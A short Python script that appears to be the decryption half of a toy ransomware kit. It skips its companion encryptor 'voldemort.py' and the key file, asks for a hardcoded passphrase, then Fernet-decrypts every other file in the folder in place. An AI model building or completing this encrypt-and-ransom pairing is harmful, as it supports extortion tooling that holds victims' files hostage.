import os
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
        if file == "voldemort.py"or file == "thekey.key" or file == "decrypt.py" :
                continue
        if os.path.isfile(file):
                files.append(file)

print (files)

phrase = "Kc135f2009@lex"
user_phrase = input("Enter the phrase to decrypt : ")
if user_phrase == phrase:
	with open ("thekey.key", "rb") as key:
		secretkey = key.read()

	for file in files:
        	with open(file, "rb")as thefile:
                	contents = thefile.read()
        	contents_decrypted = Fernet(secretkey).decrypt(contents)
        	with open(file, "wb") as thefile:
                	thefile.write(contents_decrypted)
	print ("nice")
else:
	("fuck off")
